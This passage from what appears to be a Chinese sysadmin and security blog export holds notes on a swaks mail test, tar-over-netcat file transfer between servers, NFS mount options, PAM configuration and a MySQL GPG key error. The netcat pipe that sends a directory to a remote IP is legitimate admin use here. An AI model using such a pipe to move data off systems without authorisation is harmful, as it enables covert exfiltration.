class="hljs-operator">-</span><span class="hljs-type">QQ</span><span class="hljs-operator">-</span>mid: xmmxszc77t1635855899t7bp0g5xq<br><span class="hljs-type">X</span><span class="hljs-operator">-</span><span class="hljs-type">QQ</span><span class="hljs-operator">-</span><span class="hljs-type">XMAILINFO</span>: <span class="hljs-type">MSstRF5C1p</span><span class="hljs-regexp">/jvJQ7kmkfTyc2EJJ9X6ZkP4+bxJ4Dj/</span><span class="hljs-type">ED4g9FYbGeb</span><span class="hljs-operator">/</span><span class="hljs-type">YiyAFbU9</span><br> <span class="hljs-type">IX</span><span class="hljs-regexp">/vq43cBNmqRVvdjGOYKoNy3Fu80/</span>zPjkx<span class="hljs-operator">+</span>vD83dby91KPYANKnAlINj<span class="hljs-regexp">/74SA1FxANtG9zIhJ/</span><span class="hljs-type">C</span><br> <span class="hljs-type">Rcg5cGBd2RsuLrooKppy</span><span class="hljs-regexp">/IgBKCdF4bH0aNLLIr3KGZ8oTZDf/</span>agRi1fDITpMyqCYEWMyoLXMsi6N<br> szeCp88mzW8yEG80s1qNPjSGEyS5nV87hE9zgoqBrY9BIpwgNFauvB2L0NExL<span class="hljs-operator">/</span>llhTrK4oSkHwGg<br> <span class="hljs-type">EhkmCtClZrQt3</span><span class="hljs-regexp">/4rLqLZoxPyrS+LkZFagabNO/</span><span class="hljs-type">L6VkJtNsdfFQ8msOnkVYDSsrzM0Q9UGwMURN</span><span class="hljs-operator">/</span><span class="hljs-number">2</span><br> 4dpNl5T<span class="hljs-regexp">/07O1WV6qm9TU/</span>flYi1uLTYqWU06ceVniiQ4dJdMo8v1lz309jAtNwMVFxVqhIxnm3vVd<br> 6zePbC<span class="hljs-regexp">/4DRoNc5eccbT404Y70r9nLWDmMgq342jWEBU9ta3kkx+ZbXysr/</span><span class="hljs-type">LqHVWl</span><span class="hljs-operator">+</span><span class="hljs-type">Hm08qlNgAGL</span><br> kMc0AMQbHa5Ea6kjP04Pzl<span class="hljs-regexp">/KU3Yn7nae/</span><span class="hljs-type">IID8Cd8Xeta</span><span class="hljs-operator">/</span><span class="hljs-type">M4qdsomKq8hNQhWMIPmOLkU3E9wuwaj</span><br> t0bFCf4dnO4DcTeJQv3QZVWcCSGkqzbjcrIannBPWDTLOu<span class="hljs-operator">+</span>rO9WCYo817bSYntFqlWflCR15mXog<br> <span class="hljs-regexp">/jhK5oaZ0a5uaCO6HA00YZP8CfKv6pXDYM6lzD6tkZZVI4YC+A/</span>5AQ3OK71X1bmdBaZw<span class="hljs-operator">==</span><br><span class="hljs-type">Date</span>: <span class="hljs-type">Tue</span>, <span class="hljs-number">02</span> <span class="hljs-type">Nov</span> <span class="hljs-number">2021</span> <span class="hljs-number">20</span>:<span class="hljs-number">24</span>:<span class="hljs-number">59</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br><span class="hljs-type">To</span>: nc0isini<span class="hljs-meta">@foxmail</span>.com<br><span class="hljs-type">From</span>: hawk0<span class="hljs-meta">@vict</span>.site<br><span class="hljs-type">Subject</span>:test1<br><span class="hljs-type">Message</span><span class="hljs-operator">-</span><span class="hljs-type">Id</span>: <span class="hljs-operator">&lt;</span><span class="hljs-number">20211102202459.1761162</span><span class="hljs-meta">@localhost</span>.localdomain<span class="hljs-operator">&gt;</span><br><span class="hljs-type">X</span><span class="hljs-operator">-</span><span class="hljs-type">Mailer</span>: swaks v20190914.<span class="hljs-number">0</span> jetmore.org<span class="hljs-regexp">/john/</span>code<span class="hljs-regexp">/swaks/</span><br><br><span class="hljs-type">This</span> <span class="hljs-keyword">is</span> a test mailing<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux_ransfer_file</title>
    <link href="/2024/05/16/yunwei/tips/Linux/linux_ransfer_file/"/>
    <url>/2024/05/16/yunwei/tips/Linux/linux_ransfer_file/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>1、需要将1台Linux服务器的数据迁移到另1台Linux服务器</p><p>2、服务器登录通过堡垒机登录，无法使用 scp 或 rsync</p><p>考虑使用 tar 和 nc 命令进行传输</p><h2 id="命令说明"><a href="#命令说明" class="headerlink" title="命令说明"></a>命令说明</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>unix下常用的压缩命令</p><p>本次传输所需的参数如下</p><p>-a ：archive 压缩保持权限在内的属性</p><p>-r ：recursive 递归压缩目录</p><h3 id="nc（netcat）"><a href="#nc（netcat）" class="headerlink" title="nc（netcat）"></a>nc（netcat）</h3><p>本次传输所需的参数如下</p><p>-l ： 开启监听</p><p>-u：指定协议为UDP</p><p>-p：指定监听端口</p><p>需要注意的：</p><p>不同版本的nc，命令不同，nc -lp port 和 nc -l port 哪个可用就用哪个</p><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="接收端"><a href="#接收端" class="headerlink" title="接收端"></a>接收端</h3><p>命令</p><p>nc -l -p 9999 | tar xf -</p><p>解释</p><p>监听端口 9999</p><p>接受到文件后解压到本地（因为是以数据流的形式），如果不解压，只会传输不会保存</p><p>文件接受完成后会自动断开连接，结束监听</p><p>示例</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> sec_ftp]<span class="hljs-meta"># nc -l -p 9999 | tar xf -</span><br></code></pre></td></tr></table></figure><h3 id="发送端"><a href="#发送端" class="headerlink" title="发送端"></a>发送端</h3><p>命令</p><p>tar cf - 目录名 | nc serverip 9999</p><p>tar cf - rcracki_mt_0.7.0_linux_x86_64.zip | nc 10.235.151.11 9999</p><p>解释</p><p>将需要传输的目录压缩转换为字节流</p><p>示例</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@webscan</span><span class="hljs-number">-54</span> sec_ftp]<span class="hljs-meta"># tar -cf - music | nc 10.211.222.33 9999</span><br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] 使用 tar、nc 在 Linux 机器之间传文件和目录 编程木子</p><p><a href="https://zhuanlan.zhihu.com/p/351095535">https://zhuanlan.zhihu.com/p/351095535</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>tips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/05/13/yunwei/commands/mount/"/>
    <url>/2024/05/13/yunwei/commands/mount/</url>
    
    <content type="html"><![CDATA[<p>title: mount<br>date: 2024&#x2F;5&#x2F;13<br>categories: </p><ul><li>yunwei</li><li>commands<br>tags:</li><li>yunwei</li><li>commands<br>typora-root-url: .&#x2F;mount</li></ul><span id="more"></span><p>mount -t nfs -o vers&#x3D;3,timeo&#x3D;600,nolock,rsize&#x3D;1048576,wsize&#x3D;1048576,hard,retrans&#x3D;3,noresvport,async,noatime,nodiratime scan.security.nfs.cu-beijing-1-a.nas.nevis.sina.com.cn:&#x2F;share .&#x2F;sfs</p><h4 id="t-fstype"><a href="#t-fstype" class="headerlink" title="-t fstype"></a>-t fstype</h4><p>指定文件系统类型</p><p>支持的文件系统类型可以查看 &#x2F;proc&#x2F;filesystems或 &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</p><p><strong>cat &#x2F;proc&#x2F;filesystems</strong></p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">[root@nvm<span class="hljs-number">-9</span>bph6mpm2uq0 data0]# cat /<span class="hljs-keyword">proc</span>/filesystems<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>sysfs<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>tmpfs<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>bdev<span class="hljs-title"></span><br><span class="hljs-title">nodev</span><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">nodev</span>cgroup<span class="hljs-title"></span><br><span class="hljs-title">nodev</span>cgroup2<br></code></pre></td></tr></table></figure><p><strong>ls &#x2F;lib&#x2F;modules&#x2F;$(uname -r)&#x2F;kernel&#x2F;fs</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">[root@nvm<span class="hljs-number">-9</span>bph6mpm2uq0 data0]<span class="hljs-comment"># ls /lib/modules/$(uname -r)/kernel/fs</span><br>afs                <span class="hljs-keyword">cachefiles </span> cifs  exfat  fat      fuse  isofs  lockd          netfs  nfs_common  nls        pstore        squashfs  xfs<br><span class="hljs-keyword">binfmt_misc.ko.xz </span> ceph        dlm   <span class="hljs-keyword">ext4 </span>  fscache  gfs2  <span class="hljs-keyword">jbd2 </span>  mbcache.ko.xz  nfs    nfsd        overlayfs  smbfs_common  udf<br></code></pre></td></tr></table></figure><h4 id="o，–options-opts"><a href="#o，–options-opts" class="headerlink" title="-o，–options opts"></a>-o，–options opts</h4><p>指定特殊的选项</p><h5 id="async"><a href="#async" class="headerlink" title="async"></a>async</h5><p>I&#x2F;O 异步传输</p><h5 id="atime"><a href="#atime" class="headerlink" title="atime"></a>atime</h5><p>不使用noatime特性，因此inode访问时间由内核默认值控制</p><h5 id="noatime"><a href="#noatime" class="headerlink" title="noatime"></a>noatime</h5><p>不更新文件访问时间（access time）</p><h5 id="nodiratime"><a href="#nodiratime" class="headerlink" title="nodiratime"></a>nodiratime</h5><p>不更新目录访问时间（access time）</p><h5 id="diratime"><a href="#diratime" class="headerlink" title="diratime"></a>diratime</h5><p>更新目录访问时间，默认配置，如果设置noatime，该配置忽略</p><h5 id="nolock"><a href="#nolock" class="headerlink" title="nolock"></a>nolock</h5><h5 id="noresvport"><a href="#noresvport" class="headerlink" title="noresvport"></a>noresvport</h5><h5 id="vers"><a href="#vers" class="headerlink" title="vers"></a>vers</h5><h5 id="timeo"><a href="#timeo" class="headerlink" title="timeo"></a>timeo</h5><h5 id="rsize"><a href="#rsize" class="headerlink" title="rsize"></a>rsize</h5><p>设置读缓冲区字节大小</p><p>rsize&#x3D;1048576</p><h5 id="wsize"><a href="#wsize" class="headerlink" title="wsize"></a>wsize</h5><p>设置写缓冲区字节大小</p><p>wsize&#x3D;1048576</p><h5 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h5><h5 id="retrans"><a href="#retrans" class="headerlink" title="retrans"></a>retrans</h5><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><h3 id="nfs缺少帮助程序"><a href="#nfs缺少帮助程序" class="headerlink" title="nfs缺少帮助程序"></a>nfs缺少帮助程序</h3><h4 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h4><p>mount -t nfs -o async,noatime,nodiratime scan.nas.baidu.com:&#x2F;share .&#x2F;sfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount: /data0/sfs: bad option; <span class="hljs-keyword">for</span> several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&lt;<span class="hljs-built_in">type</span>&gt; helper program.<br></code></pre></td></tr></table></figure><h4 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h4><p>根据错误提示可知，缺乏&#x2F;sbin&#x2F;mount.nfs程序</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@nvm<span class="hljs-number">-9</span>bph6mpm2uq0 data0]<span class="hljs-meta"># /sbin/mount.nfs</span><br><span class="hljs-symbol">bash:</span> <span class="hljs-keyword">/sbin/</span>mount.nfs: No such file or directory<br></code></pre></td></tr></table></figure><p>在其他服务器上查看存在该程序</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@localhost</span> /]<span class="hljs-comment"># ls /sbin/mount.nfs</span><br><span class="hljs-regexp">/sbin/mount</span>.nfs<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@nvm<span class="hljs-string">-9</span>bph6mpm2uq0 data0]# yum list | grep nfs<br>centos-release-nfs-ganesha4.noarch                   1.0<span class="hljs-string">-2</span>.el9                           extras<br>libnfsidmap.i686                                     1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>libnfsidmap.x86_64                                   1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>libstoragemgmt-nfs-plugin.x86_64                     1.9.7<span class="hljs-string">-2</span>.el9                         appstream<br>nfs-utils.x86_64                                     1:2.5.4<span class="hljs-string">-25</span>.el9                      baseos<br>nfs-utils-coreos.x86_64                              1:2.5.4<span class="hljs-string">-25</span>.el9                      appstream<br>nfs4-acl-tools.x86_64                                0.4.2<span class="hljs-string">-3</span>.el9                         baseos<br>nfsv4-client-utils.x86_64                            1:2.5.4<span class="hljs-string">-25</span>.el9                      appstream<br>pcp-pmda-nfsclient.x86_64                            6.2.0<span class="hljs-string">-2</span>.el9_4                       appstream<br>sssd-nfs-idmap.x86_64                                2.9.4<span class="hljs-string">-6</span>.el9_4                       baseos<br>texlive-mfnfss.noarch                                9:20200406<span class="hljs-string">-26</span>.el9_2                 appstream<br>texlive-psnfss.noarch                                9:20200406<span class="hljs-string">-26</span>.el9_2                 appstream<br></code></pre></td></tr></table></figure><p>解决方案</p><p>sudo yum install nfs-utils  </p><p>sudo dnf install nfs-utils</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@nvm</span>-<span class="hljs-number">9</span>bph6mpm2uq0 data0]<span class="hljs-comment"># ls /sbin/mount.nfs</span><br><span class="hljs-regexp">/sbin/mount</span>.nfs<br></code></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mount</span> -t nfs -o vers=<span class="hljs-number">3</span>,timeo=<span class="hljs-number">600</span>,nolock,rsize=<span class="hljs-number">1048576</span>,wsize=<span class="hljs-number">1048576</span>,hard,retrans=<span class="hljs-number">3</span>,noresvport,async,noatime,nodiratime nfs.domain:/share ./sfs<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux_pam_auth</title>
    <link href="/2024/05/07/security/osSec/linux_pam_auth/"/>
    <url>/2024/05/07/security/osSec/linux_pam_auth/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="PAM简介"><a href="#PAM简介" class="headerlink" title="PAM简介"></a>PAM简介</h1><p>Pluggable Authentication Modules 可插拔式认证模块</p><p>提供对所有服务进行认证的中央机制</p><p>适用于：login、远程登录（telnet、login、fsh、ftp、ppp）、su等应用程序</p><p>由于是PAM为嵌入式，因此修改配置后会立刻生效</p><h1 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h1><p>认证顺序为 Service（服务）-&gt; PAM（配置文件）-&gt; 认证文件</p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>目录：&#x2F;etc&#x2F;pam.d&#x2F;，可以通过配置文件来确认支持PAM认证的程序</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ pam.<span class="hljs-keyword">d</span>]# <span class="hljs-keyword">ls</span> /etc/pam.<span class="hljs-keyword">d</span>/<br>atd                  login             postlogin-<span class="hljs-keyword">ac</span>       smtp.postfix          system-auth<br>chfn                 other             remote             sshd                  system-auth-<span class="hljs-keyword">ac</span><br>chsh                 passwd            runuser            <span class="hljs-keyword">su</span>                    systemd-user<br>config-util          password-auth     runuser-<span class="hljs-keyword">l</span>          subscription-manager  vlock<br>crond                password-auth-<span class="hljs-keyword">ac</span>  smartcard-auth     sudo<br>fingerprint-auth     polkit-1          smartcard-auth-<span class="hljs-keyword">ac</span>  sudo-i<br>fingerprint-auth-<span class="hljs-keyword">ac</span>  postlogin         smtp               <span class="hljs-keyword">su</span>-<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p>配置文件中的每一行都是独立的认证过程，PAM模块自上到下的顺序调用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@iZbp1191gh7vw52537lyxrZ pam.d]# cat /etc/pam.d/su<br>#%PAM<span class="hljs-number">-1</span>twarden<span class="hljs-number">.0</span><br>authsufficientpam_rootok.so<br># Uncomment the <span class="hljs-keyword">following</span> <span class="hljs-type">line</span> <span class="hljs-keyword">to</span> implicitly trust users <span class="hljs-keyword">in</span> the &quot;wheel&quot; <span class="hljs-keyword">group</span>.<br><span class="hljs-meta">#authsufficientpam_wheel.so trust use_uid</span><br># Uncomment the <span class="hljs-keyword">following</span> <span class="hljs-type">line</span> <span class="hljs-keyword">to</span> require a <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> be <span class="hljs-keyword">in</span> the &quot;wheel&quot; <span class="hljs-keyword">group</span>.<br><span class="hljs-meta">#authrequiredpam_wheel.so use_uid</span><br>authsubstack<span class="hljs-keyword">system</span>-auth<br>auth<span class="hljs-keyword">include</span>postlogin<br>accountsufficientpam_succeed_if.so uid = <span class="hljs-number">0</span> use_uid quiet<br>account<span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">password</span><span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">session</span><span class="hljs-keyword">include</span><span class="hljs-keyword">system</span>-auth<br><span class="hljs-keyword">session</span><span class="hljs-keyword">include</span>postlogin<br><span class="hljs-keyword">session</span>optionalpam_xauth.so<br></code></pre></td></tr></table></figure><p>第一列 - PAM认证模块类型</p><p>auth-对用户身份进行识别，例如提示输入密码，是否为root等</p><p>account-对账号各项属性进行检测，例如是否允许登录系统，账号是否过期等</p><p>password-使用用户信息来更新数据，例如修改密码</p><p>session-设置用户登录前以及退出后需要进行的会话操作管理，例如登录连接信息</p><p>第二列 - PAM控制标记</p><p>sufficient-该认证过程成功后表示该模块成功，将不再进行后续的认证。该认证过程失败，不影响后续认证</p><p>required-该认证过程必须成功后才表示该模块成功，如果该认证过程失败后，后续认证会继续进行，等到后续认证完成后返回失败</p><p>requisite-与required相似，只有该认证过程成功后才表示该模块成功，如果该认证过程失败，则会立刻返回该模块失败，控制权返回给应用程序</p><p>substack-表示</p><p>include-表示在验证过程中需要加载调用其他配置文件，例如很多应用都会调用&#x2F;etc&#x2F;pam.d&#x2F;system-auth（主要用于用户登录系统认证）</p><p>optional-不进行认证是否成功的验证，只显示信息，常用于session</p><p>第三列 - PAM模块</p><p>默认在&#x2F;lib64&#x2F;security或&#x2F;lib&#x2F;security目录，如果没有在这两个目录，需要写绝对路径</p><p>模块可以出现在多个配置文件中，也就是多个PAM认证中</p><p>第四列 - PAM模块参数</p><p>根据不同的模块设置，可以有多个参数，多个参数使用空格分隔</p><h2 id="认证文件"><a href="#认证文件" class="headerlink" title="认证文件"></a>认证文件</h2><p>目录：&#x2F;lib64&#x2F;security</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@iZbp1191gh7vw52537lyxrZ security]# <span class="hljs-keyword">ls</span><br>pam_access.<span class="hljs-keyword">so</span>     pam_filter        pam_mkhomedir.<span class="hljs-keyword">so</span>       pam_selinux.<span class="hljs-keyword">so</span>     pam_unix_auth.<span class="hljs-keyword">so</span><br>pam_cap.<span class="hljs-keyword">so</span>        pam_filter.<span class="hljs-keyword">so</span>     pam_motd.<span class="hljs-keyword">so</span>            pam_sepermit.<span class="hljs-keyword">so</span>    pam_unix_passwd.<span class="hljs-keyword">so</span><br>pam_chroot.<span class="hljs-keyword">so</span>     pam_ftp.<span class="hljs-keyword">so</span>        pam_namespace.<span class="hljs-keyword">so</span>       pam_shells.<span class="hljs-keyword">so</span>      pam_unix_session.<span class="hljs-keyword">so</span><br>pam_console.<span class="hljs-keyword">so</span>    pam_group.<span class="hljs-keyword">so</span>      pam_nologin.<span class="hljs-keyword">so</span>         pam_stress.<span class="hljs-keyword">so</span>      pam_unix.<span class="hljs-keyword">so</span><br>pam_cracklib.<span class="hljs-keyword">so</span>   pam_issue.<span class="hljs-keyword">so</span>      pam_permit.<span class="hljs-keyword">so</span>          pam_succeed_if.<span class="hljs-keyword">so</span>  pam_userdb.<span class="hljs-keyword">so</span><br>pam_debug.<span class="hljs-keyword">so</span>      pam_keyinit.<span class="hljs-keyword">so</span>    pam_postgresok.<span class="hljs-keyword">so</span>      pam_systemd.<span class="hljs-keyword">so</span>     pam_warn.<span class="hljs-keyword">so</span><br>pam_deny.<span class="hljs-keyword">so</span>       pam_lastlog.<span class="hljs-keyword">so</span>    pam_pwhistory.<span class="hljs-keyword">so</span>       pam_tally2.<span class="hljs-keyword">so</span>      pam_wheel.<span class="hljs-keyword">so</span><br>pam_echo.<span class="hljs-keyword">so</span>       pam_limits.<span class="hljs-keyword">so</span>     pam_pwquality.<span class="hljs-keyword">so</span>       pam_time.<span class="hljs-keyword">so</span>        pam_xauth.<span class="hljs-keyword">so</span><br>pam_env.<span class="hljs-keyword">so</span>        pam_listfile.<span class="hljs-keyword">so</span>   pam_rhosts.<span class="hljs-keyword">so</span>          pam_timestamp.<span class="hljs-keyword">so</span><br>pam_exec.<span class="hljs-keyword">so</span>       pam_localuser.<span class="hljs-keyword">so</span>  pam_rootok.<span class="hljs-keyword">so</span>          pam_tty_audit.<span class="hljs-keyword">so</span><br>pam_faildelay.<span class="hljs-keyword">so</span>  pam_loginuid.<span class="hljs-keyword">so</span>   pam_securetty.<span class="hljs-keyword">so</span>       pam_umask.<span class="hljs-keyword">so</span><br>pam_faillock.<span class="hljs-keyword">so</span>   pam_mail.<span class="hljs-keyword">so</span>       pam_selinux_permit.<span class="hljs-keyword">so</span>  pam_unix_acct.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><p>也就是说用户访问服务器的某个服务，对应的服务器程序将用户请求发送到PAM模块进行认证，先判断具体的服务，再加载相应的PAM配置文件，最后通过认证文件进行认证</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]  系统安全及应用(su命令切换用户、PAM认证、sudo授权等) waldosia 2021-11-29 19:03:43</p><p><a href="https://blog.51cto.com/u_15386194/4715298">https://blog.51cto.com/u_15386194/4715298</a></p><p>[2] Linux配置允许普通用户免密码切换其他普通用户 chyuhung 2021-07-29 15:23</p><p><a href="https://www.cnblogs.com/chyuhung/p/15075280.html">https://www.cnblogs.com/chyuhung/p/15075280.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>system_security_hardening</title>
    <link href="/2024/05/07/security/osSec/system_security_hardening/"/>
    <url>/2024/05/07/security/osSec/system_security_hardening/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>osSec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>osSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/04/18/security/secconstruction/Untitled/"/>
    <url>/2024/04/18/security/secconstruction/Untitled/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>error_RPM-GPG-KEY-mysql</title>
    <link href="/2024/04/18/yunwei/errors/error_RPM-GPG-KEY-mysql/"/>
    <url>/2024/04/18/yunwei/errors/error_RPM-GPG-KEY-mysql/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>yum   update &#x2F; yum install mysql命令提示RPM-GPG-KEY-mysql不存在</p><p>报错信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">Downloading packages:<br>warning: <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/yum/</span>x86_64<span class="hljs-regexp">/7/my</span>sql57-community<span class="hljs-regexp">/packages/my</span>sql-community-common-<span class="hljs-number">5.7</span>.<span class="hljs-number">44</span>-<span class="hljs-number">1</span>.el7.x86_64.rpm: Header V4 RSA/SHA256 Signature, key ID <span class="hljs-number">3</span>a79bd29: NOKEY<br>从 file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>pki<span class="hljs-regexp">/rpm-gpg/</span>RPM-GPG-KEY-mysql 检索密钥<br><br><br>来自 file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>pki<span class="hljs-regexp">/rpm-gpg/</span>RPM-GPG-KEY-mysql 的无效 GPG 密钥：No key found <span class="hljs-keyword">in</span> given key data<br></code></pre></td></tr></table></figure><p>解决方案</p><p>安装密钥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">rpm --<span class="hljs-keyword">import</span> https:<span class="hljs-comment">//repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>访问控制与身份管理</title>
    <link href="/2024/04/18/security/secconstruction/%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE%E4%B9%8B%E9%81%93/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8E%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86/"/>
    <url>/2024/04/18/security/secconstruction/%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE%E4%B9%8B%E9%81%93/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8E%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>访问控制是所有安全工作的基础，提供了实现信息安全的基本功能模块，是对抗系统和网络资源非法访问的第一道防线。</p><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>访问控制：Access Control</p><p>指通过合理地设定访问策略，确保合法主体访问受保护的客体</p><h3 id="访问控制要素"><a href="#访问控制要素" class="headerlink" title="访问控制要素"></a>访问控制要素</h3><p>主体：发起访问资源请求，可以是用户、</p><p>客体</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secconstruction</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secconstruction</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yum</title>
    <link href="/2024/04/17/yunwei/commands/yum/"/>
    <url>/2024/04/17/yunwei/commands/yum/</url>
    
